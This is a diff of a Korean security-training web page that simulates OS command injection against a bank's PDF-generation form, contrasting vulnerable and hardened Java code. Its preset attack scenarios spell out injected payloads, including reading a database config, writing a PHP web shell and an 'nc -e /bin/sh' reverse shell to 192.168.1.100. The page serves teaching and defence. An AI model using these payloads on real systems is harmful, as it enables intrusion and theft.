@@ -3,292 +3,591 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Easy Command Injection Simulator</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>금융권 Command Injection 모의해킹 시뮬레이터 - WEB-SER-014</title>
+    <script src="https://cdn.tailwindcss.com?plugins=forms"></script>
+    <script>
+        tailwind.config = { theme: { extend: {} } }
+    </script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Jua&family=Noto+Sans+KR:wght@400;700&display=swap');
-        body { font-family: 'Noto Sans KR', sans-serif; background-color: #f0f9ff; }
-        .font-comic { font-family: 'Jua', sans-serif; }
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Noto+Sans+KR:wght@400;700;900&display=swap');
+        body { font-family: 'Noto Sans KR', sans-serif; }
+        .font-code { font-family: 'Fira Code', monospace; }
 
-        /* Animation Keyframes */
-        @keyframes slideIn { from { transform: translateX(-20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
-        @keyframes pop { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         
         .animate-slide { animation: slideIn 0.5s ease-out; }
-        .animate-shake { animation: shake 0.3s ease-in-out; }
-        .animate-pop { animation: pop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        
-        .conveyor-belt {
-            background: repeating-linear-gradient(90deg, #334155 0, #334155 20px, #475569 20px, #475569 40px);
-            background-size: 40px 100%;
-            animation: moveBelt 1s linear infinite;
-        }
-        @keyframes moveBelt { from { background-position: 0 0; } to { background-position: 40px 0; } }
-        .paused { animation-play-state: paused; }
-
-        /* Custom Card Styles */
-        .cmd-card {
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
-            transition: all 0.3s ease;
-        }
+        .animate-shake { animation: shake 0.4s ease-in-out; }
+        .animate-blink { animation: blink 1s infinite; }
     </style>
 </head>
-<body class="p-4 md:p-8 h-screen overflow-y-auto">
+<body class="bg-gradient-to-br from-slate-900 via-slate-800 to-indigo-900 min-h-screen p-4 md:p-8">
 
-    <div class="max-w-5xl mx-auto space-y-8">
+    <!-- 평가기준 배너 -->
+    <div class="max-w-7xl mx-auto mb-6">
+        <div class="bg-gradient-to-r from-indigo-600 to-purple-700 border-l-4 border-yellow-400 p-4 rounded-lg backdrop-blur-sm shadow-xl">
+            <div class="flex items-start gap-3 text-white">
+                <i class="fa-solid fa-clipboard-check text-yellow-300 text-2xl mt-0.5"></i>
+                <div class="flex-1">
+                    <p class="font-bold text-lg flex items-center gap-2">
+                        📋 전자금융기반시설 보안 취약점 평가기준
+                        <span class="text-xs bg-yellow-400 text-slate-900 px-2 py-1 rounded font-black">WEB-SER-014</span>
+                    </p>
+                    <div class="mt-2 text-sm space-y-1 text-indigo-100">
+                        <div><strong>평가항목:</strong> 운영체제 명령실행 (OS Command Injection)</div>
+                        <div><strong>위험도:</strong> <span class="text-red-300 font-bold">5 (최고위험)</span></div>
+                        <div><strong>통제구분:</strong> 5.8.4 (일반공통) 서비스 보호</div>
+                        <div><strong>진단내용:</strong> 운영체제 내 임의 명령어 실행이 가능한 인터페이스의 존재 여부 점검</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-6">
         
-        <!-- Header -->
-        <div class="text-center">
-            <h1 class="text-3xl md:text-4xl font-comic text-indigo-600 mb-2">
-                <i class="fa-solid fa-robot"></i> 서버 로봇의 하루 (Command Injection)
-            </h1>
-            <p class="text-slate-600">명령어 주입 공격이 어떻게 서버를 속이는지 확인해보세요!</p>
-        </div>
-
-        <!-- 1. Controller (Input) -->
-        <div class="bg-white p-6 rounded-3xl shadow-xl border-4 border-indigo-100 relative z-10">
-            <div class="absolute -top-5 left-1/2 transform -translate-x-1/2 bg-indigo-500 text-white px-6 py-1 rounded-full font-bold text-sm shadow-md">
-                STEP 1. 명령 내리기
+        <!-- 좌측: 취약한 시스템 -->
+        <div class="lg:col-span-1 space-y-6">
+            
+            <!-- 금융사 시스템 헤더 -->
+            <div class="bg-gradient-to-r from-blue-600 to-indigo-700 p-5 rounded-2xl shadow-2xl text-white">
+                <div class="flex items-center gap-3 mb-2">
+                    <i class="fa-solid fa-building-columns text-3xl"></i>
+                    <div>
+                        <h1 class="text-xl font-black">KB국민은행</h1>
+                        <p class="text-blue-100 text-xs">백오피스 관리 시스템</p>
+                    </div>
+                </div>
+                <div class="mt-3 flex items-center gap-2 text-xs bg-red-500/30 px-3 py-2 rounded-lg backdrop-blur-sm border border-red-400">
+                    <i class="fa-solid fa-shield-xmark text-red-200"></i>
+                    <span class="font-bold">취약점: 입력값 검증 미흡</span>
+                </div>
             </div>
 
-            <div class="flex flex-col md:flex-row gap-6 items-center">
-                <div class="flex-1 w-full">
-                    <label class="block text-slate-500 font-bold mb-2">웹사이트 입력창 (Ping 테스트)</label>
-                    <div class="relative">
-                        <input type="text" id="userInput" 
-                               class="w-full p-4 border-2 border-slate-300 rounded-2xl text-xl focus:border-indigo-500 focus:ring-4 focus:ring-indigo-100 outline-none transition font-mono"
-                               placeholder="IP 주소를 입력하세요 (예: 8.8.8.8)"
-                               onkeyup="updatePreview()">
-                        <i class="fa-solid fa-keyboard absolute right-4 top-5 text-slate-400"></i>
+            <!-- 문서 생성 인터페이스 -->
+            <div class="bg-white rounded-2xl shadow-2xl border-t-4 border-indigo-500 overflow-hidden">
+                <div class="bg-gradient-to-r from-slate-50 to-slate-100 p-4 border-b-2 border-slate-200">
+                    <h2 class="font-bold text-base text-slate-800 flex items-center gap-2">
+                        <i class="fa-solid fa-file-pdf text-red-500"></i>
+                        거래내역서 PDF 생성
+                    </h2>
+                    <p class="text-xs text-slate-500 mt-1">계좌번호 입력 시 PDF 자동 생성</p>
+                </div>
+                
+                <div class="p-5">
+                    <form id="pdfForm" onsubmit="event.preventDefault(); executeTest();">
+                        <div class="mb-4">
+                            <label class="block text-xs font-bold text-slate-700 mb-2 uppercase tracking-wide">
+                                <i class="fa-solid fa-wallet text-indigo-500 mr-1"></i> 계좌번호
+                            </label>
+                            <input type="text" id="accountInput" 
+                                   class="w-full p-3 border-2 border-slate-300 rounded-lg focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 font-code text-sm transition-all"
+                                   placeholder="123-456-789012" 
+                                   onkeyup="updateCommandPreview()"
+                                   autocomplete="off">
+                        </div>
+                        
+                        <!-- 모의해킹 시나리오 -->
+                        <div class="mb-4">
+                            <p class="text-xs font-bold text-slate-600 mb-2 flex items-center gap-1">
+                                <i class="fa-solid fa-flask"></i> 모의해킹 테스트 시나리오
+                            </p>
+                            <div class="space-y-2">
+                                <button type="button" onclick="setScenario('normal')" 
+                                        class="w-full px-3 py-2 bg-emerald-50 hover:bg-emerald-100 rounded-lg text-xs font-bold text-emerald-700 border border-emerald-200 transition text-left">
+                                    <i class="fa-solid fa-check-circle"></i> 정상 요청
+                                </button>
+                                
+                                <button type="button" onclick="setScenario('attack1')" 
+                                        class="w-full px-3 py-2 bg-red-50 hover:bg-red-100 rounded-lg text-xs font-bold text-red-700 border border-red-200 transition text-left">
+                                    <i class="fa-solid fa-bug"></i> 공격 1: 파일 목록 (ls)
+                                </button>
+                                
+                                <button type="button" onclick="setScenario('attack2')" 
+                                        class="w-full px-3 py-2 bg-orange-50 hover:bg-orange-100 rounded-lg text-xs font-bold text-orange-700 border border-orange-200 transition text-left">
+                                    <i class="fa-solid fa-file-code"></i> 공격 2: 설정파일 (cat)
+                                </button>
+                                
+                                <button type="button" onclick="setScenario('attack3')" 
+                                        class="w-full px-3 py-2 bg-purple-50 hover:bg-purple-100 rounded-lg text-xs font-bold text-purple-700 border border-purple-200 transition text-left">
+                                    <i class="fa-solid fa-bomb"></i> 공격 3: 백도어 설치
+                                </button>
+                                
+                                <button type="button" onclick="setScenario('attack4')" 
+                                        class="w-full px-3 py-2 bg-yellow-50 hover:bg-yellow-100 rounded-lg text-xs font-bold text-yellow-700 border border-yellow-200 transition text-left">
+                                    <i class="fa-solid fa-network-wired"></i> 공격 4: 리버스쉘
+                                </button>
+                            </div>
+                        </div>
+
+                        <button type="submit" 
+                                class="w-full bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 text-white py-3 rounded-lg font-bold shadow-lg transition transform active:scale-95 flex items-center justify-center gap-2 text-sm">
+                            <i class="fa-solid fa-play"></i>
+                            테스트 실행
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- 취약한 코드 -->
+            <div class="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-red-500">
+                <div class="bg-red-900/50 px-4 py-3 border-b border-red-700 flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <i class="fa-solid fa-skull-crossbones text-red-400"></i>
+                        <span class="text-sm font-bold text-red-200">취약한 Java 코드</span>
                     </div>
-                    <div class="mt-3 flex gap-2">
-                        <button onclick="setScenario('normal')" class="bg-green-100 hover:bg-green-200 text-green-700 px-3 py-1.5 rounded-lg text-sm font-bold transition">
-                            <i class="fa-regular fa-circle-check"></i> 정상 요청
-                        </button>
-                        <button onclick="setScenario('attack')" class="bg-red-100 hover:bg-red-200 text-red-700 px-3 py-1.5 rounded-lg text-sm font-bold transition">
-                            <i class="fa-solid fa-skull"></i> 해킹 요청 (; ls)
-                        </button>
+                    <span class="text-xs bg-red-600 text-white px-2 py-1 rounded font-bold">위험</span>
+                </div>
+                
+                <div class="p-4 font-code text-xs leading-relaxed text-slate-300">
+<pre>// ❌ 취약한 코드 예시
+String account = request.getParameter("account");
+
+<span class="text-red-400">// Runtime.exec() 직접 사용</span>
+String cmd = "python3 generate_pdf.py " + account;
+Runtime.getRuntime().exec(cmd);
+
+<span class="text-red-400">// 또는 ProcessBuilder 잘못된 사용</span>
+ProcessBuilder pb = new ProcessBuilder("sh", "-c", 
+    "python3 generate_pdf.py " + account);
+pb.start();</pre>
+                </div>
+                
+                <div class="bg-red-900/30 border-t border-red-700/50 px-4 py-2">
+                    <p class="text-xs text-red-300 flex items-start gap-2">
+                        <i class="fa-solid fa-exclamation-triangle mt-0.5"></i>
+                        <span><strong>문제점:</strong> 입력값 검증 없이 쉘 명령어로 전달</span>
+                    </p>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- 중앙: 명령어 실행 과정 -->
+        <div class="lg:col-span-1 space-y-6">
+
+            <!-- 실행 명령어 -->
+            <div class="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-slate-700">
+                <div class="bg-slate-800 px-4 py-3 border-b border-slate-700 flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <i class="fa-solid fa-terminal text-green-400"></i>
+                        <span class="text-sm font-bold text-slate-300">실행 명령어</span>
                     </div>
                 </div>
                 
-                <div class="hidden md:block text-4xl text-slate-300">
-                    <i class="fa-solid fa-arrow-right"></i>
-                </div>
-
-                <!-- Preview Box -->
-                <div class="w-full md:w-1/3 bg-slate-800 text-white p-4 rounded-xl font-mono text-sm shadow-inner">
-                    <div class="text-slate-400 text-xs mb-1">서버가 해석한 최종 명령어:</div>
-                    <div id="serverCmdPreview" class="text-yellow-400 font-bold break-all">
-                        ping -c 3 <span class="opacity-50">...</span>
+                <div class="p-4 font-code text-xs leading-relaxed text-slate-300 min-h-[100px]">
+                    <div class="text-purple-400">$ python3 generate_pdf.py</div>
+                    <div class="flex items-center gap-1 mt-1">
+                        <span class="text-blue-400">--account</span>
+                        <span class="text-yellow-300">"</span><span id="cmdPreview" class="text-yellow-300 font-bold break-all">...</span><span class="text-yellow-300">"</span>
                     </div>
                 </div>
             </div>
 
-            <div class="mt-6 text-center">
-                <button onclick="runAnimation()" class="bg-indigo-600 hover:bg-indigo-700 text-white text-lg px-8 py-3 rounded-full font-bold shadow-lg transform transition active:scale-95">
-                    <i class="fa-solid fa-play"></i> 실행하기
-                </button>
-            </div>
-        </div>
-
-        <!-- 2. Visualization Stage (The Server Robot) -->
-        <div class="bg-white p-2 md:p-8 rounded-3xl shadow-xl border-4 border-slate-200 min-h-[400px] relative overflow-hidden">
-            <div class="absolute -top-5 left-1/2 transform -translate-x-1/2 bg-slate-600 text-white px-6 py-1 rounded-full font-bold text-sm shadow-md z-10">
-                STEP 2. 서버 내부 처리 과정
-            </div>
-
-            <!-- Background Elements -->
-            <div class="absolute bottom-0 left-0 w-full h-4 bg-slate-300 z-0"></div> <!-- Floor -->
-            <div class="absolute top-20 right-10 opacity-20 text-9xl text-slate-300">
-                <i class="fa-solid fa-server"></i>
-            </div>
-
-            <!-- Scene Container -->
-            <div class="relative z-10 h-full flex flex-col justify-center items-center py-10" id="sceneContainer">
-                
-                <!-- Initial State Message -->
-                <div id="idleState" class="text-center text-slate-400">
-                    <i class="fa-solid fa-robot text-6xl mb-4 animate-bounce"></i>
-                    <p class="text-xl">명령을 기다리고 있습니다...</p>
+            <!-- 서버 프로세스 모니터 -->
+            <div class="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-slate-700">
+                <div class="bg-gradient-to-r from-slate-800 to-slate-700 px-4 py-3 border-b border-slate-600">
+                    <h2 class="font-bold text-base text-white flex items-center gap-2">
+                        <i class="fa-solid fa-server"></i>
+                        서버 프로세스 모니터
+                    </h2>
                 </div>
 
-                <!-- Animation Actors (Hidden by default) -->
-                <div id="animationStage" class="hidden w-full flex flex-col items-center gap-8">
+                <div id="monitorContent" class="p-5 min-h-[350px] flex items-center justify-center">
+                    <div class="text-center text-slate-500">
+                        <i class="fa-solid fa-server text-5xl mb-3 opacity-30"></i>
+                        <p class="text-sm">대기 중...</p>
+                    </div>
+                </div>
+
+                <div id="processingStage" class="hidden p-5 space-y-3">
+                    <div id="step1" class="flex items-start gap-2 opacity-0 transition-opacity duration-500">
+                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-blue-500 flex items-center justify-center text-white font-bold text-xs">1</div>
+                        <div class="flex-1">
+                            <div class="font-bold text-blue-300 text-xs">입력값 수신</div>
+                            <div class="text-xs text-slate-400" id="step1Text">...</div>
+                        </div>
+                        <i class="fa-solid fa-check-circle text-green-400"></i>
+                    </div>
+
+                    <div id="step2" class="flex items-start gap-2 opacity-0 transition-opacity duration-500">
+                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500 flex items-center justify-center text-white font-bold text-xs">2</div>
+                        <div class="flex-1">
+                            <div class="font-bold text-purple-300 text-xs">명령어 생성</div>
+                            <div class="text-xs text-slate-400 font-code" id="step2Text">...</div>
+                        </div>
+                        <i id="step2Icon" class="fa-solid fa-spinner fa-spin text-purple-400"></i>
+                    </div>
+
+                    <div id="step3" class="flex items-start gap-2 opacity-0 transition-opacity duration-500">
+                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-yellow-500 flex items-center justify-center text-white font-bold text-xs">3</div>
+                        <div class="flex-1">
+                            <div class="font-bold text-yellow-300 text-xs">실행</div>
+                            <div class="text-xs text-slate-400" id="step3Text">...</div>
+                        </div>
+                        <i id="step3Icon" class="fa-solid fa-hourglass-half text-yellow-400"></i>
+                    </div>
+
+                    <div id="step4" class="hidden flex items-start gap-2 bg-red-900/30 border-l-4 border-red-500 p-3 rounded-r-lg animate-shake">
+                        <div class="flex-shrink-0 w-6 h-6 rounded-full bg-red-600 flex items-center justify-center text-white">
+                            <i class="fa-solid fa-exclamation text-xs"></i>
+                        </div>
+                        <div class="flex-1">
+                            <div class="font-bold text-red-300 text-xs">⚠️ 추가 명령어 감지!</div>
+                            <div class="text-xs text-red-200" id="step4Text">...</div>
+                        </div>
+                    </div>
+
+                    <div id="terminalOutput" class="hidden mt-3 bg-black/50 rounded-lg p-3 border border-green-500/30 max-h-[200px] overflow-y-auto">
+                        <div class="flex items-center gap-2 mb-2 text-green-400 text-xs font-bold">
+                            <i class="fa-solid fa-terminal"></i>
+                            <span>SHELL OUTPUT</span>
+                        </div>
+                        <div id="terminalLines" class="font-code text-xs space-y-1 text-green-300"></div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- 우측: 안전한 코드 & 결과 -->
+        <div class="lg:col-span-1 space-y-6">
+
+            <!-- 안전한 Java 코드 -->
+            <div class="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-emerald-500">
+                <div class="bg-emerald-900/50 px-4 py-3 border-b border-emerald-700 flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <i class="fa-solid fa-shield-halved text-emerald-400"></i>
+                        <span class="text-sm font-bold text-emerald-200">안전한 Java 코드</span>
+                    </div>
+                    <span class="text-xs bg-emerald-600 text-white px-2 py-1 rounded font-bold">권장</span>
+                </div>
+                
+                <div class="p-4 font-code text-xs leading-relaxed text-slate-300 max-h-[400px] overflow-y-auto">
+<pre>// ✅ 안전한 코드 예시
+import java.util.regex.Pattern;
+
+<span class="text-emerald-400">// 1. 입력값 화이트리스트 검증</span>
+String account = request.getParameter("account");
+Pattern pattern = Pattern.compile("^[0-9\\-]+$");
+
+if (!pattern.matcher(account).matches()) {
+    throw new SecurityException(
+        "유효하지 않은 계좌번호 형식");
+}
+
+<span class="text-emerald-400">// 2. 길이 제한</span>
+if (account.length() > 20) {
+    throw new SecurityException(
+        "계좌번호가 너무 깁니다");
+}
+
+<span class="text-emerald-400">// 3. ProcessBuilder로 안전하게 실행</span>
+<span class="text-blue-400">// 배열 형태로 전달 (쉘 해석 방지)</span>
+ProcessBuilder pb = new ProcessBuilder(
+    "python3",           <span class="text-gray-500">// 명령어</span>
+    "generate_pdf.py",   <span class="text-gray-500">// 스크립트</span>
+    "--account",         <span class="text-gray-500">// 옵션</span>
+    account              <span class="text-gray-500">// 인자 (검증됨)</span>
+);
+
+<span class="text-emerald-400">// 4. 작업 디렉토리 제한</span>
+pb.directory(new File("/var/www/bank/pdf"));
+
+<span class="text-emerald-400">// 5. 환경변수 정리 (공격 방지)</span>
+Map&lt;String, String&gt; env = pb.environment();
+env.clear();
+env.put("PATH", "/usr/bin");
+
+<span class="text-emerald-400">// 6. 타임아웃 설정</span>
+Process process = pb.start();
+if (!process.waitFor(30, TimeUnit.SECONDS)) {
+    process.destroy();
+    throw new TimeoutException("실행 시간 초과");
+}
+
+<span class="text-emerald-400">// 7. 실행 결과 검증</span>
+int exitCode = process.exitValue();
+if (exitCode != 0) {
+    <span class="text-gray-500">// 에러 로깅 및 처리</span>
+    logger.error("PDF 생성 실패: " + exitCode);
+    throw new RuntimeException("PDF 생성 오류");
+}</pre>
+                </div>
+                
+                <div class="bg-emerald-900/30 border-t border-emerald-700/50 px-4 py-2">
+                    <p class="text-xs text-emerald-300 flex items-start gap-2">
+                        <i class="fa-solid fa-lightbulb mt-0.5"></i>
+                        <span><strong>핵심:</strong> 입력값 검증 + 배열 형태 전달 + 환경 제한</span>
+                    </p>
+                </div>
+            </div>
+
+            <!-- 추가 방어 기법 -->
+            <div class="bg-white rounded-2xl shadow-xl p-5">
+                <h3 class="font-bold text-sm text-slate-800 mb-3 flex items-center gap-2">
+                    <i class="fa-solid fa-list-check text-indigo-600"></i>
+                    추가 방어 기법 (Defense in Depth)
+                </h3>
+                <div class="space-y-2 text-xs">
+                    <div class="flex items-start gap-2">
+                        <i class="fa-solid fa-check text-green-500 mt-0.5"></i>
+                        <div>
+                            <strong>화이트리스트 검증:</strong> 정규식으로 허용된 문자만 통과
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i class="fa-solid fa-check text-green-500 mt-0.5"></i>
+                        <div>
+                            <strong>명령어 배열 전달:</strong> 쉘 해석 방지
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i class="fa-solid fa-check text-green-500 mt-0.5"></i>
+                        <div>
+                            <strong>최소 권한 원칙:</strong> 전용 계정으로 실행
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i class="fa-solid fa-check text-green-500 mt-0.5"></i>
+                        <div>
+                            <strong>샌드박스:</strong> chroot/Docker 컨테이너 사용
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i class="fa-solid fa-check text-green-500 mt-0.5"></i>
+                        <div>
+                            <strong>로깅/모니터링:</strong> 모든 명령어 실행 기록
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 평가 결과 -->
+            <div id="resultBox" class="hidden animate-slide">
+                <div id="resultCard" class="rounded-2xl border-4 shadow-2xl p-5">
+                    <div class="flex items-start gap-3 mb-3">
+                        <i id="resultIcon" class="text-4xl"></i>
+                        <div class="flex-1">
+                            <h3 class="text-lg font-black mb-1" id="resultTitle"></h3>
+                            <p class="text-xs leading-relaxed" id="resultDesc"></p>
+                        </div>
+                    </div>
                     
-                    <!-- 1. The Command Packet -->
-                    <div id="packet" class="flex gap-2 transition-all duration-1000 transform translate-x-[-100vw]">
-                        <!-- Legitimate Command -->
-                        <div class="bg-green-500 text-white p-3 rounded-lg shadow-lg flex items-center gap-2">
-                            <i class="fa-solid fa-network-wired"></i>
-                            <span class="font-bold">PING (8.8.8.8)</span>
+                    <div id="stolenDataBox" class="hidden bg-white/80 backdrop-blur-sm rounded-lg p-3 border-2 mb-3">
+                        <div class="flex items-center gap-2 mb-2 text-xs font-bold uppercase tracking-wide text-red-700">
+                            <i class="fa-solid fa-database"></i>
+                            <span>유출/실행 결과</span>
                         </div>
-                        <!-- Malicious Command (Hidden initially) -->
-                        <div id="maliciousPacket" class="hidden bg-red-600 text-white p-3 rounded-lg shadow-lg flex items-center gap-2 animate-shake">
-                            <i class="fa-solid fa-folder-open"></i>
-                            <span class="font-bold">파일 훔쳐보기 (ls)</span>
-                        </div>
+                        <pre class="font-code text-xs text-slate-800 whitespace-pre-wrap overflow-x-auto max-h-[150px] overflow-y-auto" id="stolenData"></pre>
                     </div>
 
-                    <!-- 2. The Server Robot -->
-                    <div class="relative">
-                        <div id="robot" class="text-8xl text-slate-700 transition-transform duration-500">
-                            <i class="fa-solid fa-robot"></i>
+                    <!-- 평가 판정 -->
+                    <div class="bg-slate-900 text-slate-300 rounded-lg p-3">
+                        <div class="flex items-center gap-2 mb-2 text-indigo-400 font-bold text-xs">
+                            <i class="fa-solid fa-gavel"></i>
+                            <span>평가 판정</span>
                         </div>
-                        <!-- Speech Bubble -->
-                        <div id="robotSpeech" class="absolute -top-16 -right-20 bg-white border-2 border-slate-300 p-3 rounded-xl rounded-bl-none shadow-md hidden animate-pop whitespace-nowrap z-20">
-                            <p class="text-sm font-bold text-slate-700" id="robotText">처리 중...</p>
+                        <div class="text-xs space-y-1 text-slate-400">
+                            <div><strong class="text-white">평가항목:</strong> WEB-SER-014 운영체제 명령실행</div>
+                            <div><strong class="text-white">판정:</strong> <span id="judgement" class="font-bold"></span></div>
+                            <div><strong class="text-white">근거:</strong> <span id="evidence"></span></div>
                         </div>
                     </div>
-
-                    <!-- 3. Output Area -->
-                    <div id="outputArea" class="w-full max-w-2xl bg-slate-900 text-green-400 p-4 rounded-xl font-mono text-sm min-h-[120px] shadow-inner opacity-0 transition-opacity duration-500">
-                        <div class="border-b border-slate-700 pb-2 mb-2 text-slate-400 text-xs">TERMINAL OUTPUT</div>
-                        <div id="terminalLines" class="space-y-1"></div>
-                    </div>
-
                 </div>
-
             </div>
-        </div>
 
-        <!-- 3. Explanation -->
-        <div id="explanationBox" class="hidden bg-yellow-50 border-l-8 border-yellow-400 p-6 rounded-r-xl shadow-md animate-slide">
-            <h3 class="text-xl font-bold text-yellow-800 mb-2">
-                <i class="fa-solid fa-lightbulb"></i> 왜 이런 일이 일어났나요?
-            </h3>
-            <p class="text-yellow-900 mb-4">
-                개발자는 로봇에게 <b>"Ping 명령어 뒤에 입력값을 붙여서 실행해!"</b>라고 시켰습니다.<br>
-                하지만 <code>; (세미콜론)</code>이 <b>"명령어 구분자"</b>라는 것을 잊어버렸네요.
-            </p>
-            <div class="bg-white p-4 rounded-lg border border-yellow-200 font-mono text-sm text-slate-700">
-                <span class="text-slate-400">// 실제 서버 코드 예시</span><br>
-                system("ping " + <span class="text-red-500 font-bold">input</span>);<br><br>
-                <span class="text-slate-400">// 공격자가 "8.8.8.8; ls"를 입력하면?</span><br>
-                system("ping 8.8.8.8<span class="text-red-600 font-bold">; ls</span>"); <span class="text-blue-600 font-bold"><- 두 개의 명령어가 됨!</span>
-            </div>
         </div>
-
     </div>
 
     <script>
-        // Update Preview Text
-        function updatePreview() {
-            const input = document.getElementById('userInput').value;
-            const preview = document.getElementById('serverCmdPreview');
+        function updateCommandPreview() {
+            const input = document.getElementById('accountInput').value;
+            const preview = document.getElementById('cmdPreview');
             
             if (!input) {
-                preview.innerHTML = 'ping -c 3 <span class="opacity-50">...</span>';
+                preview.innerHTML = '<span class="opacity-50">입력 대기중...</span>';
                 return;
             }
 
-            // Syntax Highlighting for Visual Aid
             let formatted = input
-                .replace(/;/g, '<span class="text-red-500 bg-red-900/50 px-1 rounded mx-1 text-lg">;</span>')
-                .replace(/ls/g, '<span class="text-red-400 font-bold underline">ls</span>');
+                .replace(/;/g, '<span class="text-red-400 bg-red-900 px-1 rounded font-bold">;</span>')
+                .replace(/\|/g, '<span class="text-red-400 bg-red-900 px-1 rounded font-bold">|</span>')
+                .replace(/&/g, '<span class="text-red-400 bg-red-900 px-1 rounded font-bold">&</span>')
+                .replace(/\$/g, '<span class="text-orange-400 font-bold">$</span>')
+                .replace(/`/g, '<span class="text-purple-400 font-bold">`</span>');
 
-            preview.innerHTML = `ping -c 3 ${formatted}`;
+            preview.innerHTML = formatted;
         }
 
-        // Preset Scenarios
         function setScenario(type) {
-            const input = document.getElementById('userInput');
-            if (type === 'normal') {
-                input.value = '8.8.8.8';
-            } else {
-                input.value = '8.8.8.8; ls';
-            }
-            updatePreview();
+            const scenarios = {
+                'normal': '123-456-789012',
+                'attack1': '123-456-789012; ls -la /var/www/bank',
+                'attack2': '123; cat /var/www/bank/config/database.php',
+                'attack3': '123; echo "<?php system($_GET[\'cmd\']); ?>" > shell.php',
+                'attack4': '123; nc -e /bin/sh 192.168.1.100 4444'
+            };
+            document.getElementById('accountInput').value = scenarios[type];
+            updateCommandPreview();
         }
 
-        // Main Animation Logic
-        function runAnimation() {
-            const input = document.getElementById('userInput').value;
-            if(!input) { alert("IP 주소를 입력해주세요!"); return; }
+        async function executeTest() {
+            const input = document.getElementById('accountInput').value.trim();
+            if (!input) { alert('계좌번호를 입력해주세요!'); return; }
 
-            const isAttack = input.includes(';');
-
-            // Reset UI
-            document.getElementById('idleState').classList.add('hidden');
-            document.getElementById('animationStage').classList.remove('hidden');
-            document.getElementById('explanationBox').classList.add('hidden');
-            document.getElementById('terminalLines').innerHTML = '';
-            document.getElementById('outputArea').classList.remove('opacity-100');
+            const isAttack = /[;|&`$(){}]/.test(input);
             
-            // Reset Positions
-            const packet = document.getElementById('packet');
-            const malPacket = document.getElementById('maliciousPacket');
-            const robotSpeech = document.getElementById('robotSpeech');
-            const robotText = document.getElementById('robotText');
+            // UI 초기화
+            document.getElementById('monitorContent').classList.add('hidden');
+            document.getElementById('processingStage').classList.remove('hidden');
+            document.getElementById('resultBox').classList.add('hidden');
+            document.getElementById('step4').classList.add('hidden');
+            document.getElementById('terminalOutput').classList.add('hidden');
+            document.getElementById('terminalLines').innerHTML = '';
 
-            packet.style.transform = 'translateX(-100vw)';
-            robotSpeech.classList.add('hidden');
+            ['step1', 'step2', 'step3'].forEach(id => {
+                document.getElementById(id).style.opacity = '0';
+            });
+
+            await sleep(300);
+            
+            // Step 1
+            document.getElementById('step1').style.opacity = '1';
+            document.getElementById('step1Text').innerText = `입력: ${input}`;
+            await sleep(800);
+
+            // Step 2
+            document.getElementById('step2').style.opacity = '1';
+            document.getElementById('step2Text').innerText = `python3 generate_pdf.py --account "${input}"`;
+            await sleep(1000);
+            document.getElementById('step2Icon').className = 'fa-solid fa-check-circle text-green-400';
+
+            // Step 3
+            document.getElementById('step3').style.opacity = '1';
+            await sleep(800);
+            document.getElementById('step3Icon').className = 'fa-solid fa-cog fa-spin text-yellow-400';
+            
+            document.getElementById('terminalOutput').classList.remove('hidden');
+            addTerminalLine('> python3 generate_pdf.py --account "' + input + '"', 'text-yellow-300');
+            await sleep(700);
 
             if (isAttack) {
-                malPacket.classList.remove('hidden');
-            } else {
-                malPacket.classList.add('hidden');
-            }
+                document.getElementById('step4').classList.remove('hidden');
+                const parts = input.split(/[;|&]/);
+                const maliciousCmd = parts.slice(1).join(';').trim();
+                document.getElementById('step4Text').innerText = `명령어: ${maliciousCmd}`;
+                
+                await sleep(500);
+                addTerminalLine('> PDF 생성 완료', 'text-blue-300');
+                await sleep(300);
+                addTerminalLine('> [!] 추가 명령어 실행 중...', 'text-red-400 font-bold');
+                await sleep(800);
 
-            // Animation Sequence
-            // 1. Packet moves to Robot
-            setTimeout(() => {
-                packet.style.transform = 'translateX(0)';
-            }, 100);
-
-            // 2. Robot Receives Packet
-            setTimeout(() => {
-                robotSpeech.classList.remove('hidden');
-                robotText.innerText = "명령어 수신 완료!";
-                document.getElementById('robot').classList.add('text-indigo-600');
-            }, 1200);
-
-            // 3. Processing Task 1 (Ping)
